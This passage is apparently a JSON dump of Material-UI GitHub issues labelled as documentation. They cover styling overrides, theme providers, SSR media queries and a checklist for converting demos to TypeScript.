{\r\n      backgroundColor: colors.primary,\r\n      \"&$focused, &:hover\": {\r\n        boxShadow: `0px 0px 0px ${conspressedOutlineRadius}px ${\r\n          colors.thumbOutline\r\n        }`\r\n      },\r\n      \"&$activated\": {\r\n        boxShadow: `0px 0px 0px ${conspressedOutlineRadius * 2}px ${\r\n          colors.thumbOutline\r\n        }`\r\n      },\r\n      \"&$jumped\": {\r\n        boxShadow: `0px 0px 0px ${conspressedOutlineRadius * 2}px ${\r\n          colors.thumbOutline\r\n        }`\r\n      }\r\n    }\r\n```\r\n```\r\nreturn (\r\n    <MUISlider\r\n      classes={{\r\n        root: classes.slider,\r\n        thumb: classes.sliderThumb,\r\n        track: classes.sliderForeground\r\n      }}\r\n      min={min}\r\n      step={step}\r\n      // onChange={this.handleChange}\r\n      {...props}\r\n    />\r\n  );\r\n```\r\n\r\nHow do you override the `&$activated` class?\r\n"},{"labels":[null,"documentation",null],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nwhen the onChange callback is fired, the event.target signature should be:\r\n` {\r\n    name: string,\r\n    value: value of MenuItem\r\n}\r\n`\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nevent.target.value = undefined, but retains the name of the selected element\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:https://codesandbox.io/s/o785w2pzw9\r\n\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nMenuitem is wrapped in a different component that just maps over values and generates the element dynamically."},{"labels":[null,"documentation",null],"text":"https://next.material-ui.com/discover-more/showcase/\r\n\r\n| before | after |\r\n|-|-| \r\n|<img width=\"1190\" alt=\"Bildschirmfoto 2019-04-07 um 19 52 02\" src=\"https://user-images.githubusercontent.com/7721625/55687580-c5201700-596e-11e9-8f5d-1156362969f6.png\">|<img width=\"1190\" alt=\"Bildschirmfoto 2019-04-07 um 19 52 10\" src=\"https://user-images.githubusercontent.com/7721625/55687579-c18c9000-596e-11e9-8050-5ea5bef74742.png\">| \r\n"},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nHey, I'm using MUI  ^4.0.0-alpha.5. \r\nWhen I render a Chip with an Avatar in a dev server the style looks fine, when I do a production build it looks bad. \r\nI know that's vauge, so the difference is that in dev the width is set at 32px and in prod 40px, and the color is overriden in prod. \r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [X ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWhen I render this\r\n```jsx\r\nconst useStyles = makeStyles((theme) => ({\r\n  root: {\r\n\r\n    width: `calc(100% - ${theme.spacing(2)}px)`,\r\n    marginBottom: theme.spacing(1),\r\n    marginLeft: theme.spacing(1),\r\n    marginRight: theme.spacing(1),\r\n    border: (props) => `${theme.spacing(0.25)}px solid ${props.item.color}`,\r\n    justifyContent: 'left',\r\n    backgroundColor: 'transparent',\r\n    \"&:hover, &:focus, &:active\": {\r\n      // backgroundColor: props.item.color\r\n    }\r\n  },\r\n  outlined: {\r\n    // backgroundColor: \"transparent\"\r\n  },\r\n  avatar: {\r\n    background: (props) => props.selected ? props.item.color : 'transparent',\r\n    border: (props) => `1px solid ${props.item.color}`,\r\n    color: (props) => props.selected ? blue[900] : undefined\r\n  }\r\n}));\r\n\r\nlet Item = props => {\r\n  return (\r\n    <Chip\r\n      avatar={<Avatar>{props.item.hotKey}</Avatar>}\r\n      onClick={() => props.handleClick(props.item)}\r\n      classes={useStyles(props)}\r\n      label={props.item.name}\r\n      variant={\"outlined\"}\r\n    />\r\n  );\r\n};\r\n```\r\nIt should like this in dev and production\r\n![image](https://user-images.githubusercontent.com/5352830/55627124-b63e3680-57ad-11e9-810c-09f1979f0fce.png)\r\n\r\n\r\n## Current Behavior 😯\r\n\r\nBut when I do a production build (based on create react app) \r\nit looks like this instead \r\n![image](https://user-images.githubusercontent.com/5352830/55627158-c6eeac80-57ad-11e9-89ee-dcd36d5ea30e.png)\r\n\r\n## Steps to Reproduce 🕹\r\nI can't share the full app and am not sure where the fault could be. I'm not sure this is a great issue but am hoping for an idea where to look\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.?.?  |\r\n| React        |     16.8    |\r\n| Browser      |         Firefox|\r\n"},{"labels":["documentation"],"text":"Opening https://material-ui.com/demos/drawers/ in IE11 renders an error. Is that expected?\r\n\r\n![image](https://user-images.githubusercontent.com/92363/55584164-e6d98e00-5723-11e9-816f-6bf3bc37df2f.png)\r\n"},{"labels":["documentation",null,null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe how it should work.\r\n-->\r\nThe documentation should give a better example on how to implement `useMediaQuery` with SSR.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Explain the difference from current behavior.\r\n-->\r\nRight now, it only says this and a vage example\r\n\r\n> An implementation of matchMedia is required on the server, we recommend using css-mediaquery. We also encourage the usage of the unstable_useMediaQueryTheme version of the hook that fetches properties from the theme. This way, you can provide a ssrMatchMedia option once for all your React tree.\r\n\r\nI think it should give an example on how to use `ssrMatchMedia`, and specially, how to set the initial width (given in the example) with common SSR tools, such as NextJS, Razzle or Gatsby.\r\n\r\nRight now, I wasn't able to make this example work, but if I can, I'll gladly create a PR to complete this documentation page.\r\n\r\n"},{"labels":["documentation",null],"text":"CircularProgress components are not effected when transitions are disabled: https://material-ui.com/getting-started/faq/#how-can-i-disable-animations-globally\r\n\r\n## Expected Behavior 🤔\r\nIf transitions create is set to none, Progress components should not animate and be static. It would be nice if they were static at some value of `40`. \r\n\r\n## Current Behavior 😯\r\nCircularProgress still animates as normal when transitions are disabled.\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/embed/ry15mk4v2n\r\n\r\n## Context 🔦\r\nI am trying to perform visual snap-shot tests on some components. However since transitions are not disabled for progress components, it make this impossible\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.3.2  |\r\n| React        |    16.8.4     |\r\n| Browser      |   Chrome     |\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\nRelated but closed: https://github.com/mui-org/material-ui/issues/15041 https://github.com/mui-org/material-ui/issues/14601 https://github.com/mui-org/material-ui/issues/15012 https://github.com/mui-org/material-ui/issues/14078\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nEither:\r\n- `ThemeProvider` documentation should include the usage of theme object created by `createMuiTheme` if theme props needed to be a fully themed object.\r\n\r\nor\r\n- `ThemeProvider` should automatically merge custom theme into default theme according to 4.0.0 docs\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nCurrently, because of theme provided into `ThemeProvider` doesn't get merged into default theme, and documentation doesn't state that either, the theme object acquired from `useTheme` or from theme context in general will be just a bare bone custom theme, causing core components trying to read the  theme but get undefined value instead, causing an error. \r\nhttps://github.com/mui-org/material-ui/issues/14078 said to use `install` from `@material-ui/styles` but that has been removed.\r\nThe current fix is  to create a theme using `createMuiTheme` then provide the result into `ThemeProvider`\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\nhttps://codesandbox.io/s/3r8ljzo2xp taken from https://material-ui.com/css-in-js/advanced/#theming,  and yep it's broken. If you log a theme object from `useTheme`  within `DeepChild` the result will be an object  contain only `background` key. While  in  v3 theme  object  would contain all theme value including default theme.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm setting up a new small app project trying to use full hook in my app(less HOCs possible).\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.0-alpha.6  |\r\n| React        |  v16.8.6       |\r\n| Browser      |  chromium 73.0.3683.75       |\r\n| TypeScript   |    -     |\r\n| etc.         |         |\r\n\r\n### Edited\r\nUpon further investigation. `ThemeProvider` from 3.0.0-alpha10 works without providing fully themed object into props, and theme context doesn't get merged with default theme either. I right now don't know which one is the expect behavior, but I'd suggest  merging custom theme with default theme and provide into context so that the theme object also provide other essential values to be used."},{"labels":[null,"documentation"],"text":"Our docs currently use the [term \"root element\"](https://5c9cd4f410d97b00085c4530--material-ui.netlify.com/api/menu-item/#props) to describe where excess props are spread.\r\n\r\nThis term is currently not explicitly defined and has room for ambiguity. The goal of this issue is to find a definition and apply that to every core component to reduce [surprising API behavior](https://en.wikipedia.org/wiki/Principle_of_least_astonishment).\r\n\r\n## Definition\r\n### root = outermost\r\nIf we take the rendered output from a component one could argue that the \"root\" is the top element e.g.\r\n\r\n```jsx\r\nfunction Component() {\r\n  return (\r\n    <RootElement>\r\n      <NotARootElement>\r\n        <NotARootElementEither />\r\n      </NotARootElement>\r\n    </RootElement>\r\n  );\r\n}\r\n```\r\n\r\n### Drawbacks\r\n\r\nThis would not apply to many components currently ([Popper](https://github.com/mui-org/material-ui/blob/2dedcc12fda827a9bbb0bece2f94aa0695e73a7c/packages/material-ui/src/Popper/Popper.js#L174), [TableHead](https://github.com/mui-org/material-ui/blob/23549d4edee4d418c72685489de7e9ab4380e9f2/packages/material-ui/src/TableHead/TableHead.js#L22) etc.). In general this definition wouldn't be very useful since every component introduced that wouldn't even change the behavior would be a breaking change (e.g. `Context.Provider`, `StrictMode`, `Fragment`, `EventListener`).\r\n\r\n### root = outermost host\r\n```jsx\r\nfunction Component() {\r\n  return (\r\n    <NotARootElement>\r\n      <div data-is-root={true}>\r\n        <NotARootElementEither />\r\n      </div>\r\n    </NotARootElement>\r\n  );\r\n}\r\n```\r\n\r\nMost of the components would currently be covered by defining the \"root element\" as the outermost element that renders a [host element](https://reactjs.org/docs/implementation-notes.html#mounting-host-elements).\r\n\r\n### Drawbacks\r\n\r\nIt is not obvious by looking at the implementation what the root is. Maintainers might know this but without any context we don't know what components render host elements. If we look at the example it is not obvious if `NotARootElement` is rendering a host element or not (see our transition components).\r\n\r\nThis definition would break when portaling or when we add wrapper containers for styling purposes. \r\n\r\nIt is also not very useful for testing. Let's say we define that the `ListItem` is the root element of a `MenuItem`. We want to test that props for the `ListItem` are actually spread to it but the definition provides no selector to find the `ListItem` and check if every prop is there. What we would find is an `li` host element and that shouldn't have any props for the `ListItem` at that point.\r\n\r\n### root = defined per component\r\nThe root element would be what we define via `@inheritComponent`. The definition would add the following constraints to the component:\r\n1. The root element has the `root` class\r\n2. Excess props are spread to this element\r\n3. The root element has the type of `inheritComponent`\r\n4. [ ] The ref is forwarded to the root element (unclear if this adds value)\r\n5. [ ] The root element renders the outermost host element (undecided\r\n\r\n#### remarks\r\n##### about 4.\r\nFor measuring it would make sense to apply the ref to the outermost host. Can be mitigated by exposing an additional ref prop that is applied to the outermost host\r\n\r\n## about \"host *element*\"\r\n\r\nIt might be ok to use it in the following context: \"Excess props are spread to the root element\". However, saying that \"Paper is the root element\" is technically not correct. \"Paper would be the root **component**\" (or element type; but that's an uncommon term). \"`<Paper />` would be an actual root element\". This is just nitpicking but while we're at it we might as well do it right.\r\n\r\n/cc @mui-org/core-contributors "},{"labels":["documentation",null],"text":"Just a suggestion on how to make the first-time documentation experience a little more smooth.\r\n\r\nThe **Get Started** button on the homepage links to the [Installation](https://material-ui.com/getting-started/installation/) doc.\r\n\r\nWhen the viewport is slightly narrow, the nav on the left is hidden. \r\n\r\n<img width=\"1283\" alt=\"Screen Shot 2019-03-27 at 10 56 28 AM\" src=\"https://user-images.githubusercontent.com/4713486/55100614-85f4ea80-507f-11e9-9eaf-34fecd6ac5b4.png\">\r\n\r\nTo complete the getting started experience, it'd be helpful to include a `Next steps` section at the bottom of the Installation doc, that links to the [Usage](https://material-ui.com/getting-started/usage/)."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nThe following codebox example should work:\r\n\r\nhttps://next.material-ui.com/demos/tabs/#customized-tabs\r\nhttps://codesandbox.io/s/1ol8m70qw7 \r\n\r\n## Current Behavior\r\n\r\nThe `theme` is not defined:\r\n\r\n<img width=\"559\" alt=\"Screenshot 2019-03-26 at 09 58 44\" src=\"https://user-images.githubusercontent.com/1265681/54983814-d9970380-4fad-11e9-8de8-d54018519372.png\">\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Visit: https://next.material-ui.com/demos/tabs/#customized-tabs\r\n2. Open the codebox example\r\n\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v5.0.0-beta.6  |\r\n| React        |  v16.8.5       |\r\n| Browser      |  chrome  |\r\n| TypeScript   |  false   |\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nDialogs with `scroll=body` do not fire scroll event\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ X ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ X ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nIt should fire the scroll event since is scrolling with the body\r\n\r\n## Current Behavior 😯\r\nNot firing any event\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/7o2plqq440\r\n\r\n## Your Environment 🌎\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n| React        |     16.8.5    |\r\n| Browser      |      Chrome   |\r\n\r\n"},{"labels":["documentation",null],"text":"The built-in resolver for `defaultProps` in `react-docgen` was working so far. With #14761 and especially #15023 we need a custom resolver so that we don't have to duplicate default props resolution (adds noise, potential for bugs etc)."},{"labels":["documentation"],"text":"With #13497 we got a lot of demos using the hook API. We want to continue this effort with the goal to have all demos using the hook API, only. We want to encourage a single pattern for each problem, not many.\r\n\r\n### styles\r\n\r\nPeople are wondering when to use withStyle, makeStyles or the Box component.\r\nMost of the time, you should consider using the hook API.\r\nThere is one case where withStyles can be preferred over makeStyles. In the following case, using the hook API would create more boilerplate:\r\n```jsx\r\nconst CustomTableCell = withStyles(theme => ({\r\n  head: {\r\n    backgroundColor: theme.palette.common.black,\r\n    color: theme.palette.common.white,\r\n  },\r\n  body: {\r\n    fontSize: 14,\r\n  },\r\n}))(TableCell);\r\n```\r\nmakeStyles has many advantages over withStyles, it requires less boilerplate, it's faster, it's easier to type, it's easier to move & delete.\r\n\r\nIf you want to make contributions to this repository, we would appreciate you helping us. \r\n\r\n## Getting started\r\n\r\nTL;DR: Use #15031 as example workflows.\r\n\r\n0. Set up your fork (See ['getting started\"](https://github.com/mui-org/material-ui/blob/next/CONTRIBUTING.md#getting-started) in the contributing guide).\r\n1. Choose a demo you want to convert. For this example, we'll use: https://next.material-ui.com/demos/lists/#nested-list\r\n2. go to `./docs/src/pages/demos/lists/lists.md` and find the section. You're looking for a `{{ \"demo\": \"some-path\" }}` block:\r\n```\r\n  {{\"demo\": \"pages/demos/lists/NestedList.js\"}}\r\n                               ^^^ Name of the demo file in `./docs/src/pages/demos/lists/` \r\n```\r\n3. Make sure a TypeScript variant is available. If it's not, you should handle #14897 first in a different pull request.\r\n4. Only migrate the TypeScript variant. The TypeScript variant of the demo (.tsx) is used to generate the JavaScript variant (.js). \r\n5. run `docs:typescript:formatted` to update the JavaScript version.\r\n6. Submit a PR\r\n\r\n## While working\r\n\r\nIf you're stuck at any point you can still submit the PR. A maintainer will take a look and provide guidance.\r\n\r\n**This migration task is highly repetitive, we should be able to largely automate it with the appropriate search & replace.**"},{"labels":["documentation",null],"text":"```tsx\r\nimport CssBaseline from \"@material-ui/core/CssBaseline\";\r\nimport { createMuiTheme, Theme } from \"@material-ui/core/styles\";\r\nimport { styled, ThemeProvider } from \"@material-ui/styles\";\r\nimport * as React from \"react\";\r\nconst theme = createMuiTheme({});\r\nconst Box = styled(\"div\")((t: Theme) => ({\r\n    backgroundColor: t.palette.primary.main,\r\n    height: 100,\r\n    width: 100,\r\n}));\r\nexport default function Bootstrap() {\r\n    return (\r\n        <ThemeProvider theme={theme}>\r\n            <CssBaseline />\r\n            <Box />\r\n        </ThemeProvider>\r\n    );\r\n}\r\n```\r\n<img width=\"1060\" alt=\"屏幕快照 2019-03-21 下午8 17 22\" src=\"https://user-images.githubusercontent.com/6634415/54751592-617bb700-4c16-11e9-9ae2-002a4a16ac6a.png\">\r\n"},{"labels":["documentation",null],"text":"Tried importing this from material-ui and its not working.\r\nIt says: Module not found: Can't resolve '@material-ui/icons/Delete'"},{"labels":[null,"documentation",null],"text":"I found that `Tooltip` doesn't show when negative z-index is used. For instance:\r\n```jsx\r\n<Tooltip title=\"foo\">\r\n  <h1 className=\"I-have-negative-z-index\">Tooltip doesn't show on me.</h1>\r\n</Tooltip>\r\n```\r\nI've been searching for a work around, and tried [all these different variations](https://codesandbox.io/s/8kk5nj9zoj)  (demo on codesandbox), but no luck... Is there a work around?\r\n\r\nThanks!!"},{"labels":[null,"documentation",null],"text":"Hello. I have a simple app.\r\n\r\n```\r\nimport AppBar from '@material-ui/core/AppBar'\r\n\r\nexport default () => (\r\n  <AppBar position=\"static\">app bar</AppBar>\r\n)\r\n```\r\n\r\nAfter rendering I see all unused styles of AppBar component.\r\n\r\n```\r\n<style data-jss=\"\" data-meta=\"MuiAppBar\">\r\n.MuiAppBar-root-2 {\r\n  width: 100%;\r\n  display: flex;\r\n  z-index: 1100;\r\n  box-sizing: border-box;\r\n  flex-shrink: 0;\r\n  flex-direction: column;\r\n}\r\n.MuiAppBar-positionFixed-3 {\r\n  top: 0;\r\n  left: auto;\r\n  right: 0;\r\n  position: fixed;\r\n}\r\n.MuiAppBar-positionAbsolute-4 {\r\n  top: 0;\r\n  left: auto;\r\n  right: 0;\r\n  position: absolute;\r\n}\r\n.MuiAppBar-positionSticky-5 {\r\n  top: 0;\r\n  left: auto;\r\n  right: 0;\r\n  position: sticky;\r\n}\r\n.MuiAppBar-positionStatic-6 {\r\n  position: static;\r\n}\r\n.MuiAppBar-positionRelative-7 {\r\n  position: relative;\r\n}\r\n.MuiAppBar-colorDefault-8 {\r\n  color: rgba(0, 0, 0, 0.87);\r\n  background-color: #f5f5f5;\r\n}\r\n.MuiAppBar-colorPrimary-9 {\r\n  color: #fff;\r\n  background-color: #3f51b5;\r\n}\r\n.MuiAppBar-colorSecondary-10 {\r\n  color: #fff;\r\n  background-color: #f50057;\r\n}\r\n</style>\r\n```\r\n\r\nWhy ?"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nShould be able to set max, min, expression, maxlength, required on the control and when invalid should set the error prop.\r\n\r\n## Current Behavior 😯\r\nRight now only required does anything and that only puts the * on the label.  None of the other HTML 5 validators do anything to the control itself even when inputProps are set.  Yes it blocks form post but it doesn't give visual cues.\r\n\r\n\r\n## Context 🔦\r\nRight now the only way to do form validation with Material-UI is to use separate libraries, most of which add unwanted ceremony to something that should be trivial with these controls.  IT would be greatly desirable to only have to use material-ui and have the controls reflect their status properly automatically."},{"labels":["documentation",null],"text":"I'm just getting started with TypeScript and Material UI. I'm trying to use the `styled` API from the CSS in JS alpha.\r\n\r\nLet's say I've the following code:\r\n\r\n```ts\r\n// @ts-ignore\r\nconst IframeWrapper: React.ComponentType = styled('div')({\r\n  flex: '0 0 auto',\r\n  padding: '0 0 20%',\r\n  position: 'relative',\r\n  width: '20%',\r\n});\r\n```\r\n\r\nAnd I would like to style all `iframe`s inside on this class. In Styled Components I would do it like [this](https://www.styled-components.com/docs/basics#pseudoelements-pseudoselectors-and-nesting). \r\n\r\nHow can I achieve the same when using the `styled` API from Material UI?\r\n\r\n\r\n\r\nThis is not related to this issue but I would love it if you would also take a look at [this issue](https://stackoverflow.com/questions/55185884/material-ui-css-in-js-typing)."},{"labels":["documentation",null,null],"text":"It's a bit weird to create a unnecessary function `createStyles` to deal with typescript typings.\r\n\r\nI think the normal typescript way to do this is to type the `styles` explicitly with `StyleRulesCallback`:\r\n\r\n```ts\r\nconst styles: StyleRulesCallback = (theme) => ({\r\n    root: {\r\n        display: \"flex\",\r\n        flexDirection: \"column\",\r\n    },\r\n});\r\n\r\nclass Component extends React.Component { ... }\r\n\r\nexport default withStyles(styles)(Component)\r\n```\r\n\r\nMaybe we can remove `createStyles` function and use this in the guide."},{"labels":["documentation",null],"text":"These demos don't show the scroll idea when browsing with the 4K display, which is a popular display size nowadays. \r\n\r\nThere are just not enough tabs to see the scroll.\r\n\r\n![image](https://user-images.githubusercontent.com/2733862/54497280-6c2a0980-4901-11e9-9fe3-50db0e6a0d8c.png)\r\n\r\nhttps://material-ui.com/demos/tabs/#scrollable-tabs\r\n\r\n"},{"labels":["documentation",null,null],"text":"With #13229 we got the proper infrastructure to present our demos both in JavaScript and TypeScript. We want to continue this effort with the goal to have all demos available in TypeScript.\r\n\r\nIf you want to make contributions to this repository and know a bit of TypeScript we would appreciate you helping us.\r\n\r\n## Getting started\r\n\r\nTL;DR: Use #14739, #14485 or #14535 as example workflows.\r\n\r\n0. Set up your fork (See ['getting started\"](https://github.com/mui-org/material-ui/blob/next/CONTRIBUTING.md#getting-started) in the contributing guide).\r\n1. Choose a demo you want to convert. For this example, we'll use: https://next.material-ui.com/demos/lists/#nested-list\r\n1. go to `./docs/src/pages/demos/lists/lists.md` and find the section. You're looking for a `{{ \"demo\": \"some-path\" }}` block:\r\n\r\n```\r\n  {{\"demo\": \"pages/demos/lists/NestedList.js\"}}\r\n                               ^^^ Name of the demo file in `./docs/src/pages/demos/lists/`\r\n```\r\n\r\n3. Copy this file into the same directory and change the extension to `.tsx`\r\n4. Add types\r\n5. run `yarn docs:typescript:check` to verify your work\r\n6. Submit a PR\r\n\r\n## While working\r\n\r\nIf you're stuck at any point and the type checker will not let your code pass you can still submit the PR. A maintainer will take a look and provide guidance.\r\n\r\nIt's important that you don't change any behavior. To verify this you can run `yarn docs:typescript:formatted`. This will transpile the typescript demos to JavaScript. This _should_ **not** cause changes in any JavaScript file. It is possible, however, that this will uncover a bug, at which point a change to the JavaScript version is more than welcome. You may encounter some changes in whitespace (mainly added or removed lines). Changes to the JavaScript file are perfectly fine in this case.\r\n\r\n## Work Items\r\n\r\n### Missing\r\n\r\n* components/steppers:\r\n\r\n  - [ ] SwipeableTextMobileStepper #18503\r\n\r\n\r\n### done\r\n\r\n<details>\r\n<summary>done</summary>\r\n\r\n- components/app-bar:\r\n\r\n  - [x] BackToTop\r\n  - [x] BottomAppBar\r\n  - [x] ButtonAppBar\r\n  - [x] DenseAppBar\r\n  - [x] ElevateAppBar #15522\r\n  - [x] HideAppBar #15522\r\n  - [x] MenuAppBar\r\n  - [x] PrimarySearchAppBar\r\n  - [x] SearchAppBar\r\n\r\n* components/autocomplete:\r\n\r\n  - [x] IntegrationAutosuggest #15485\r\n  - [x] IntegrationDownshift #15755\r\n  - [x] IntegrationReactSelect #14772\r\n\r\n- components/avatars #14954:\r\n\r\n  - [x] IconAvatars\r\n  - [x] ImageAvatars\r\n  - [x] LetterAvatars\r\n\r\n* components/badges:\r\n\r\n  - [x] BadgeAlignment\r\n  - [x] BadgeMax #15013\r\n  - [x] BadgeOverlap\r\n  - [x] BadgeVisibility #14969\r\n  - [x] CustomizedBadges\r\n  - [x] DotBadge #14969\r\n  - [x] SimpleBadge #14969\r\n\r\n- components/bottom-navigation #14979:\r\n\r\n  - [x] LabelBottomNavigation\r\n  - [x] SimpleBottomNavigation\r\n\r\n* components/breadcrumbs #15139:\r\n\r\n  - [x] CollapsedBreadcrumbs\r\n  - [x] CustomizedBreadcrumbs\r\n  - [x] CustomSeparator\r\n  - [x] IconBreadcrumbs\r\n  - [x] RouterBreadcrumbs\r\n  - [x] SimpleBreadcrumbs\r\n\r\n- components/buttons:\r\n\r\n  - [x] ButtonBases\r\n  - [x] ButtonSizes\r\n  - [x] ContainedButtons\r\n  - [x] CustomizedButtons\r\n  - [x] FloatingActionButtons\r\n  - [x] FloatingActionButtonZoom\r\n  - [x] GroupedButtons\r\n  - [x] IconButtons\r\n  - [x] IconLabelButtons\r\n  - [x] OutlinedButtons\r\n  - [x] SplitButton #17862\r\n  - [x] TextButtons\r\n\r\n* components/cards:\r\n\r\n  - [x] ImgMediaCard #15130\r\n  - [x] MediaCard #15011\r\n  - [x] MediaControlCard #15011\r\n  - [x] RecipeReviewCard #15011\r\n  - [x] SimpleCard #15011\r\n\r\n- components/checkboxes:\r\n\r\n  - [x] Checkboxes #15222\r\n  - [x] CheckboxesGroup #15228\r\n  - [x] CheckboxLabels #15237\r\n  - [x] CustomizedCheckbox\r\n  - [x] FormControlLabelPosition #17964\r\n\r\n* components/chips:\r\n\r\n  - [x] Chips #15052\r\n  - [x] ChipsArray #15050\r\n  - [x] OutlinedChips #15052\r\n  - [x] SmallChips\r\n  - [x] SmallOutlinedChips\r\n\r\n- components/click-away-listener:\r\n\r\n  - [x] ClickAway #16322\r\n\r\n* components/container #16322:\r\n\r\n  - [x] FixedContainer\r\n  - [x] SimpleContainer\r\n\r\n- components/dialogs:\r\n\r\n  - [x] AlertDialog #15271\r\n  - [x] AlertDialogSlide #15271\r\n  - [x] ConfirmationDialog #15273\r\n  - [x] CustomizedDialogs\r\n  - [x] DraggableDialog #15271\r\n  - [x] FormDialog #15271\r\n  - [x] FullScreenDialog #15271\r\n  - [x] MaxWidthDialog #15272\r\n  - [x] ResponsiveDialog #15271\r\n  - [x] ScrollDialog #15271\r\n  - [x] SimpleDialog #15271\r\n\r\n* components/dividers #15037:\r\n\r\n  - [x] InsetDividers\r\n  - [x] ListDividers\r\n  - [x] MiddleDividers\r\n  - [x] SubheaderDividers\r\n  - [x] VerticalDividers\r\n\r\n- components/drawers:\r\n\r\n  - [x] ClippedDrawer #15284\r\n  - [x] MiniDrawer #15119\r\n  - [x] PermanentDrawerLeft #15119\r\n  - [x] PermanentDrawerRight #15119\r\n  - [x] PersistentDrawerLeft #15119\r\n  - [x] PersistentDrawerRight 